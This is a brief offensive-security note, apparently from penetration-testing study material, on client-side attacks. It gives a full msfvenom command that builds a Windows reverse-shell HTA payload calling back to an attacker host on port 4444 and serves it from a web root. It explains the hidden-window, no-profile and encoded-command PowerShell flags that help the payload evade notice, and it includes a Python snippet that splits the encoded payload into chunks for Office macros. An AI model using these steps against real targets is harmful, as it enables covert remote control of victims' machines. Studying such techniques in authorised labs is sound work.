# Client Side Attacks

Generate and serve a client side attack that can be accessed from a browser on the target using HTML applications.  
`sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.240 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`  

Looking at evil.hta:
* -nop, is shorthand for -NoProfile,1 which instructs PowerShell not to load the PowerShell user profile. When PowerShell is started, it will, by default, load any existing user's profile scripts, which might negatively impact the execution of our code. This option will avoid that potential issue.
* -w hidden (shorthand for -WindowStyle2 hidden) to avoid creating a window on the user's desktop.
* -e flag (shorthand for -EncodedCommand) allows us to supply a Base64 encoded PowerShell script directly as a command line argument.

Split a base64 script with Python:
```python
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Useful for macros which have a string literal max length of 255, unless it is stored in a variable.

